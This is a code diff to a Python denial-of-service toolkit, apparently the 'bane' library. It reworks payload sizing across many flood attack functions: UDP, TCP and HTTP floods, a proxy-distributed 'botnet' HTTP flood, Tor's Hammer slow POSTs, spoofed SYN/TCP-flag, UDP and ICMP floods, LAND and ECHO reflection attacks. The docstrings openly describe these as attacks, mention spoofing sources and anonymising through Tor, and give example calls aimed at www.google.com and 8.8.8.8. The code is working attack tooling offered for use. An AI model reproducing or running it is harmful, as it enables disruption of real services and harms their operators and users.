@@ -49,7 +49,7 @@ def reset():
  pointer=0
  global ue
  ue=[]
-def udp(u,port=80,ports=None,level=3,size=3,connection=True,interval=300,limiting=True,logs=True,returning=False):
+def udp(u,port=80,ports=None,level=3,min_size=1,max_size=1400,connection=True,interval=300,limiting=True,logs=True,returning=False):
   '''
    this function is for UDP flood attack tests.
    
@@ -97,12 +97,6 @@ def udp(u,port=80,ports=None,level=3,size=3,connection=True,interval=300,limitin
    t=.01
   elif level>=3:
    t=.001
-  if size<=1:
-   m=1
-  elif size==2:
-   m=10
-  elif size>=3:
-   m=100
   tm=time.time()
   while (int(time.time()-tm)<=interval):
    try:
@@ -114,9 +108,8 @@ def udp(u,port=80,ports=None,level=3,size=3,connection=True,interval=300,limitin
     if connection==True:
      s.connect((u,p))
     msg=''
-    for x in range(random.randint(10,30)):
-     msg+=str(random.randint(0,1000000))+random.choice(lis)
-    msg=msg*m
+    for x in range(random.randint(min_size,max_size)):
+     msg+=random.choice(lis)
     if len(msg)>1400:
        msg=msg[0:1400]
     s.sendto((msg.encode('utf-8')),(u,p))
@@ -149,7 +142,8 @@ class tcflood(threading.Thread):
   self.port=port
   self.timeout=timeout
   self.tor=tor
-  self.amp=amp
+  self.minsize=minsize
+  self.maxsize=maxsize
   self.speed=speed
   self.packs2=packs2
   self.packs1=packs1
@@ -168,9 +162,8 @@ class tcflood(threading.Thread):
      if stop==True:
       break
      m=''
-     for li in range(30,50): 
-      m+=str(random.randint(1,1000000))+random.choice(lis)
-     m=m*self.amp
+     for li in range(random.randint(self.minsize,self.maxsize)): 
+      m+=random.choice(lis)
      try:
       if stop==True:
         break
@@ -196,7 +189,11 @@ class tcflood(threading.Thread):
   threads: (set by default to: 256) threads to use
   maxtime: (set by default to: 5) timeout flag
 '''
-def tcpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
+def tcpflood(u,p=80,min_size=1,max_size=1400,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
+ global minsize
+ minsize=min_size
+ global maxsize
+ maxsize=max_size
  global tcp_counter
  tcp_counter=0
  global tor
@@ -211,12 +208,6 @@ def tcpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=
  port=p
  global timeout
  timeout=maxtime
- global amp
- if ampli<1:
-  ampli=1
- if ampli>100:
-  ampli=100
- amp=ampli
  global packs1
  packs1=roundmax
  global packs2
@@ -252,11 +243,14 @@ def tcpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=
 class htflood(threading.Thread):
  def run(self):
   global http_counter
+  self.postfmin=postfmin
+  self.postfmax=postfmax
   self.target=target
+  self.postmin=postmin
+  self.postmax=postmax
   self.port=port
   self.timeout=timeout
   self.tor=tor
-  self.amp=amp
   self.speed=speed
   self.packs2=packs2
   self.packs1=packs1
@@ -307,15 +301,12 @@ class htflood(threading.Thread):
      else:
       req="POST"
       k=''
-      for _ in range(1,random.randint(2,5)):
-       k+=random.choice(lis)
-      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
-      for _ in range(1,random.randint(1,3)):
+      for _ in range(random.randint(self.postfmin,self.postfmax)):
        k+=random.choice(lis)
       j=''
-      for x in range(0,random.randint(11,16)):
+      for x in range(random.randint(self.postmin,self.postmax)):
        j+=random.choice(lis)
-      par =(k*random.randint(5,30))+str(random.randint(1,100000))+'='+(j*random.randint(50*self.amp,100*self.amp))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
+      par =k+'='+j
       m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,par)
      try:
       if stop==True:
@@ -324,7 +315,7 @@ class htflood(threading.Thread):
       http_counter+=1
       if prints==True:
        print("[!]Request: {} | Type: {} | Bytes: {}".format(http_counter,req,len(m)))
-     except:
+     except :
       break
      time.sleep(self.speed)
     s.close()
@@ -346,7 +337,7 @@ class htflood(threading.Thread):
 
    there will be lessons how to use them all don't worry guys xD
 '''
-def httpflood(u,p=80,threads=256,maxtime=5,ampli=1,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
+def httpflood(u,p=80,post_field_min=5,post_field_max=10,post_min=50,post_max=500,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
  '''
    this function is for http flood attack. it connect to a given port and flood it with http requests (GET & POST) with randomly headers values to make each request uniques with bypass caching engines techniques.
    it takes the following parameters:
@@ -362,6 +353,14 @@ def httpflood(u,p=80,threads=256,maxtime=5,ampli=1,roundmin=5,roundmax=15,level=
    >>>bane.httpflood('www.google.com',p=80,threads=500,maxtime=7)
 
 '''
+ global postfmin
+ postfmin=post_field_min
+ global postfmax
+ postfmax=post_field_max
+ global postmin
+ postmin=post_min
+ global postmax
+ postmax=post_max
  global http_counter
  http_counter=0
  global tor
@@ -377,12 +376,6 @@ def httpflood(u,p=80,threads=256,maxtime=5,ampli=1,roundmin=5,roundmax=15,level=
  port=p
  global timeout
  timeout=maxtime
- global amp
- if ampli<1:
-  ampli=1
- if ampli>15:
-  ampli=15
- amp=ampli
  global packs1
  packs1=roundmax
  global packs2
@@ -418,10 +411,13 @@ def httpflood(u,p=80,threads=256,maxtime=5,ampli=1,roundmin=5,roundmax=15,level=
 class prflood(threading.Thread):
  def run(self):
   global lulzer_counter
+  self.postfmin=postfmin
+  self.postfmax=postfmax
+  self.postmin=postmin
+  self.postmax=postmax
   self.target=target
   self.port=port
   self.timeout=timeout
-  self.amp=amp
   self.speed=speed
   self.packs2=packs2
   self.packs1=packs1
@@ -485,12 +481,12 @@ class prflood(threading.Thread):
      else:
       req="POST"
       k=''
-      for _ in range(1,random.randint(5,10)):
-       k+=random.choice(lis)+str(random.randint(1,1000000))
+      for _ in range(random.randint(self.postfmin,self.postfmax)):
+       k+=random.choice(lis)
       j=''
-      for x in range(0,random.randint(11,31)):
+      for x in range(random.randint(self.postmin,self.postmax)):
        j+=random.choice(lis)
-      par =(k*random.randint(5,30))+str(random.randint(1,100000))+'='+(j*random.randint(50*self.amp,100*self.amp))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
+      par =k+'='+j
       m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,par)
      try:
       if stop==True:
@@ -499,14 +495,14 @@ class prflood(threading.Thread):
       lulzer_counter+=1
       if prints==True:
        print("[!]Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,lulzer_counter,req,len(m)))
-     except:
+     except Exception as e:
       break
      time.sleep(self.speed)
     s.close()
    except:
     pass
    time.sleep(.1)
-def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,ampli=15,roundmin=5,roundmax=15,level=1,interval=3600,logs=True,returning=False):
+def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,post_field_min=5,post_field_max=10,post_min=50,post_max=500,roundmin=5,roundmax=15,level=1,interval=3600,logs=True,returning=False):
  '''
    this function is for http flood attack but it distribute the around the world by passing the requests to thousands of proxies located in many countries (it is stimulation to real life botnet).
    it takes the following parameters:
@@ -525,6 +521,14 @@ def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,amp
    >>>bane.lulzer('www.google.com',p=80,threads=500)
 
 '''
+ global postfmin
+ postfmin=post_field_min
+ global postfmax
+ postfmax=post_field_max
+ global postmin
+ postmin=post_min
+ global postmax
+ postmax=post_max
  global lulzer_counter
  lulzer_counter=0
  global stop
@@ -552,12 +556,6 @@ def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,amp
  port=p
  global timeout
  timeout=maxtime
- global amp
- if ampli<1:
-  ampli=1
- if ampli>15:
-  ampli=15
- amp=ampli
  global packs1
  packs1=roundmax
  global packs2
@@ -592,6 +590,8 @@ def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,amp
   return lulzer_counter
 class reqpost(threading.Thread):
  def run(self):
+  self.maxcontent=maxcontent
+  self.mincontent=mincontent
   self.target=target
   self.port=port
   self.timeout=timeout
@@ -609,7 +609,7 @@ class reqpost(threading.Thread):
      print("Connected to {}:{}...".format(self.target,self.port))
     if ((self.port==443) or (self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    q=random.randint(10000,15000)
+    q=random.randint(self.mincontent,self.maxcontent)
     s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target))
     for i in range(q):
      if stop==True:
@@ -628,7 +628,7 @@ class reqpost(threading.Thread):
    time.sleep(.1)
    if stop==True:
     break
-def torshammer(u,p=80,threads=500,maxtime=5,settor=False,interval=300,logs=True):
+def torshammer(u,p=80,threads=500,maxtime=5,settor=False,interval=300,logs=True,max_content=15000,min_content=10000):
  '''
     this function is used to do torshammer attack, it connects to an ip or domain with a specific port, sends a POST request with legit http headers values then sends the body slowly to keep the socket open as long as possible. it can use tor as a proxy to anonimize the attack. it supports ssl connections unlike the original tool and some bugs has been fixed and simplified.
     
@@ -648,6 +648,10 @@ def torshammer(u,p=80,threads=500,maxtime=5,settor=False,interval=300,logs=True)
     >>>bane.torshammer('www.google.com',p=80,settor=True)
 
 '''
+ global maxcontent
+ maxcontent=max_content
+ global mincontent
+ mincontent=min_content
  global stop
  stop=False
  global prints
@@ -680,6 +684,8 @@ class pham(threading.Thread):
   self.target=target
   self.port=port
   self.timeout=timeout
+  self.maxcontent=maxcontent
+  self.mincontent=mincontent
   global counter
   time.sleep(2)
   while (stop!=True):
@@ -706,7 +712,7 @@ class pham(threading.Thread):
     s.connect((self.target,self.port))
     if ((self.port==443)or(self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    q=random.randint(10000,15000)
+    q=random.randint(self.mincontent,self.maxcontent)
     s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target))
     for i in range(q):
      if stop==True:
@@ -725,7 +731,7 @@ class pham(threading.Thread):
    time.sleep(.1)
    if stop==True:
     break
-def proxhammer(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True):
+def proxhammer(u,p=80,max_content=15000,min_content=10000,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True):
  '''
   u: target ip or domain
   p: (set by default to: 80) targeted port
@@ -735,6 +741,10 @@ def proxhammer(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None
   >>>import bane
   >>>bane.proxhammer('www.google.com',threads=256)
 '''
+ global maxcontent
+ maxcontent=max_content
+ global mincontent
+ mincontent=min_content
  global httplist
  if httpl:
   httplist=httpl
@@ -1268,7 +1278,7 @@ class ptc(threading.Thread):
     s.close()
    except Exception as e:
     pass
-def proxslow(u,p=80,threads=500,maxtime=5,ampli=1,speed1=3,speed2=5,read1=1,read2=3,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True,returning=False,settor=False):
+def proxslow(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True,returning=False,settor=False):
  global proxslow_counter
  proxslow_counter=0
  global httplist
@@ -1298,12 +1308,6 @@ def proxslow(u,p=80,threads=500,maxtime=5,ampli=1,speed1=3,speed2=5,read1=1,read
  port=p
  global timeout
  timeout=maxtime
- global amp
- if ampli<1:
-  ampli=1
- if ampli>100:
-  ampli=100
- amp=ampli
  global sre1
  sre1=speed1
  global sre2
@@ -1803,6 +1807,8 @@ def checksum(msg):
 class sflood(threading.Thread): 
  def run(self):
   global synflood_counter
+  self.minsize=minsize
+  self.maxsize=maxsize
   self.speed=speed
   self.target=target
   dip=self.target
@@ -1820,7 +1826,6 @@ class sflood(threading.Thread):
   self.ip_seg=ip_seg
   self.maxttl=maxttl
   self.minttl=minttl
-  self.amp=amp
   self.s_port=s_port
   self.min_por=min_por
   self.max_por=max_por
@@ -1839,8 +1844,8 @@ class sflood(threading.Thread):
     elif self.paylo==1:
       urd=''
       req='TCP'
-      for x in range(random.randint(1*self.amp,3*self.amp)):
-       urd+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
+      for x in range(random.randint(self.minsize,self.maxsize)):
+       urd+=random.choice(lis)
       if len(urd)>1400:
        urd=urd[0:1400]
     elif self.paylo==2:
@@ -1910,7 +1915,7 @@ class sflood(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def synflood(u,p=80,limiting=True,level=1,source_port=-1,max_port=65535,min_port=1024,ip_range=None,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,window=-1,payload=0,min_ttl=64,max_ttl=64,ampli=1,interval=300,logs=True,returning=False):
+def synflood(u,p=80,limiting=True,min_size=1,max_size=1400,level=1,source_port=-1,max_port=65535,min_port=1024,ip_range=None,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,window=-1,payload=0,min_ttl=64,max_ttl=64,interval=300,logs=True,returning=False):
   '''
    this function is for TCP flags floods with spoofed randomly IPs. you can launch any type of spoofed TCP floods by modifying the parameters (SYN, SYN-ACK, ACK, ACK-PSH, FIN...) and another wonderful thing here is that you can also send either spoofed legitimte HTTP requests (GET & POST), randomly created TCP data (which you can control their size), or just send no data with the spoofed packets, also you can modify the window size and Time To Live (TTL) values for more random and unique packets!!! now this is something you won't fine anywhere else on github or stackoverflow ;).
 
@@ -1936,6 +1941,10 @@ def synflood(u,p=80,limiting=True,level=1,source_port=-1,max_port=65535,min_port
    >>>bane.synflood('8.8.8.8',syn=0,ack=1)
 
 '''
+  global minsize
+  minsize=min_size
+  global maxsize
+  maxsize=max_size
   global speed
   if level<=1:
    speed=0.1
@@ -1999,12 +2008,6 @@ def synflood(u,p=80,limiting=True,level=1,source_port=-1,max_port=65535,min_port
   maxttl=max_ttl
   global minttl
   minttl=min_ttl
-  global amp
-  if ampli<1:
-   ampli=1
-  if ampli>15:
-   ampli=15
-  amp=ampli
   wh=0
   try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
@@ -2037,7 +2040,8 @@ class udpsp(threading.Thread):
   self.port=port
   self.maxttl=maxttl
   self.minttl=minttl
-  self.amp=amp
+  self.minsize=minsize
+  self.maxsize=maxsize
   self.ip_seg=ip_seg
   self.s_port=s_port
   self.min_por=min_por
@@ -2050,8 +2054,8 @@ class udpsp(threading.Thread):
     else:
      sp=self.s_port
     msg=''
-    for x in range(random.randint(1*self.amp,3*self.amp)):
-     msg+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
+    for x in range(random.randint(self.minsize,self.maxsize)):
+     msg+=random.choice(lis)
     if len(msg)>1400:
      msg=msg[0:1400]
     if self.ip_seg==None:
@@ -2069,10 +2073,14 @@ class udpsp(threading.Thread):
    except:
     pass
    time.sleep(self.speed)
-def udpstorm(u,p=80,limiting=True,level=1,ip_range=None,source_port=-1,max_port=65535,min_port=1024,threads=100,min_ttl=64,max_ttl=64,ampli=1,interval=300,logs=True,returning=False):
+def udpstorm(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,ip_range=None,source_port=-1,max_port=65535,min_port=1024,threads=100,min_ttl=64,max_ttl=64,interval=300,logs=True,returning=False):
  '''
    this function is for UDP flood attack using spoofed sources
 '''
+ global minsize
+ minsize=min_size
+ global maxsize
+ maxsize=max_size
  global speed
  if level<=1:
   speed=0.1
@@ -2104,12 +2112,6 @@ def udpstorm(u,p=80,limiting=True,level=1,ip_range=None,source_port=-1,max_port=
  target=u
  global port
  port=p
- global amp
- if ampli<1:
-  ampli=1
- if ampli>15:
-  ampli=15
- amp=ampli
  global maxttl
  maxttl=max_ttl
  global minttl
@@ -2140,6 +2142,8 @@ def udpstorm(u,p=80,limiting=True,level=1,ip_range=None,source_port=-1,max_port=
 class ln(threading.Thread):
  def run(self):
   global land_counter
+  self.minsize=minsize
+  self.maxsize=maxsize
   self.speed=speed
   self.target=target
   self.port=port
@@ -2149,7 +2153,6 @@ class ln(threading.Thread):
   self.min_win=min_win
   self.max_win=max_win
   self.paylo=paylo
-  self.amp=amp
   time.sleep(2)
   while (stop!=True):
    try:
@@ -2165,8 +2168,8 @@ class ln(threading.Thread):
     elif self.paylo==1:
       urd=''
       req='TCP'
-      for x in range(random.randint(1*self.amp,3*self.amp)):
-       urd+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
+      for x in range(random.randint(self.minsize,self.maxsize)):
+       urd+=random.choice(lis)
       if len(urd)>1400:
        urd=urd[0:1400]
     elif self.paylo==2:
@@ -2213,10 +2216,14 @@ class ln(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def land(u,p=80,limiting=True,level=1,threads=100,max_window=255,min_window=1,min_ttl=64,max_ttl=64,ampli=1,payload=0,window=-1,interval=300,logs=True,returning=False):
+def land(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,threads=100,max_window=255,min_window=1,min_ttl=64,max_ttl=64,payload=0,window=-1,interval=300,logs=True,returning=False):
  '''
    this function is for LAND attack in which we are spoofing the victim's IP and targeted port.
 '''
+ global maxsize
+ maxsize=max_size
+ global minsize
+ minsize=min_size
  global speed
  if level<=1:
   speed=0.1
@@ -2248,12 +2255,6 @@ def land(u,p=80,limiting=True,level=1,threads=100,max_window=255,min_window=1,mi
  target=u
  global port
  port=p
- global amp
- if ampli<1:
-  ampli=1
- if ampli>15:
-  ampli=15
- amp=ampli
  global maxttl
  maxttl=max_ttl
  global minttl
@@ -2813,14 +2814,15 @@ class echst(threading.Thread):
  def run(self):
   global echo_ref_counter
   self.target=target
+  self.minsize=minsize
+  self.maxsize=maxsize
   self.speed=speed
   self.port=port
-  self.amp=amp
   time.sleep(2)
   while (stop!=True):
    data=''
-   for x in range(random.randint(1*self.amp,3*self.amp)):
-    data +=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
+   for x in range(random.randint(self.minsize,self.maxsize)):
+    data +=random.choice(lis)
    if len(data)>1400:
     data=data[0:1400]
    try:
@@ -2836,10 +2838,14 @@ class echst(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def echo_ref(u,p=80,limiting=True,level=1,pinglist=[],ampli=1,threads=100,interval=300,logs=True,returning=True):
+def echo_ref(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,pinglist=[],threads=100,interval=300,logs=True,returning=True):
  '''
    this function is for ECHO  reflection attack
 '''
+ global minsize
+ minsize=min_size
+ global maxsize
+ maxsize=max_size
  global echo_ref_counter
  echo_ref_counter=0
  global speed
@@ -2863,12 +2869,6 @@ def echo_ref(u,p=80,limiting=True,level=1,pinglist=[],ampli=1,threads=100,interv
  target=u
  global port
  port=p
- global amp
- if ampli<1:
-  ampli=1
- if ampli>15:
-  ampli=15
- amp=ampli
  global pingl
  pingl=pinglist
  wh=0
@@ -2898,16 +2898,17 @@ class icmpcl(threading.Thread):
  def run(self):
   global icmp_counter
   self.speed=speed
+  self.minsize=minsize
+  self.maxsize=maxsize
   self.target=target
   self.port=port
   self.minttl=minttl
   self.maxttl=maxttl
-  self.amp=amp
   time.sleep(2)
   while (stop!=True):
    data=''
-   for x in range(random.randint(1*self.amp,3*self.amp)):
-    data +=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
+   for x in range(random.randint(self.minsize,self.maxsize)):
+     data +=random.choice(lis)
    if len(data)>1400:
     data=data[0:1400]
    try:
@@ -2922,10 +2923,14 @@ class icmpcl(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def icmp(u,p=80,limiting=True,ampli=1,level=1,min_ttl=64,max_ttl=64,threads=100,interval=300,logs=True,returning=False):
+def icmp(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,min_ttl=64,max_ttl=64,threads=100,interval=300,logs=True,returning=False):
  '''
    this function is for ICMP flood attack
 '''
+ global maxsize
+ maxsize=max_size
+ global minsize
+ minsize=min_size
  global speed
  if level<=1:
   speed=0.1
@@ -2949,12 +2954,6 @@ def icmp(u,p=80,limiting=True,ampli=1,level=1,min_ttl=64,max_ttl=64,threads=100,
  target=u
  global port
  port=p
- global amp
- if ampli<1:
-  ampli=1
- if ampli>15:
-  ampli=15
- amp=ampli
  global maxttl
  maxttl=max_ttl
  global minttl
@@ -2990,13 +2989,13 @@ class icmpst(threading.Thread):
   self.port=port
   self.minttl=minttl
   self.maxttl=maxttl
-  self.amp=amp
+  self.minsize=minsize
   self.ip_seg=ip_seg
   time.sleep(2)
   while (stop!=True):
    data=''
-   for x in range(random.randint(1*self.amp,3*self.amp)):
-    data +=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
+   for x in range(random.randint(self.minsize,self.maxsize)):
+     data +=random.choice(lis)
    if len(data)>1400:
     data=data[0:1400]
    try:
@@ -3015,10 +3014,14 @@ class icmpst(threading.Thread):
    except Exception as e:
     pass
    time.sleep(self.speed)
-def icmpstorm(u,p=80,limiting=True,level=1,ip_range=None,ampli=1,min_ttl=64,max_ttl=64,threads=100,interval=300,logs=True,returning=True):
+def icmpstorm(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,ip_range=None,min_ttl=64,max_ttl=64,threads=100,interval=300,logs=True,returning=True):
  '''
    this function is for ICMP flood with spoofed sources
 '''
+ global minsize
+ minsize=min_size
+ global maxsize
+ maxsize=max_size
  global icmpstorm_counter
  icmpstorm_counter=0
  global speed
@@ -3044,12 +3047,6 @@ def icmpstorm(u,p=80,limiting=True,level=1,ip_range=None,ampli=1,min_ttl=64,max_
  target=u
  global port
  port=p
- global amp
- if ampli<1:
-  ampli=1
- if ampli>15:
-  ampli=15
- amp=ampli
  global maxttl
  maxttl=max_ttl
  global minttl
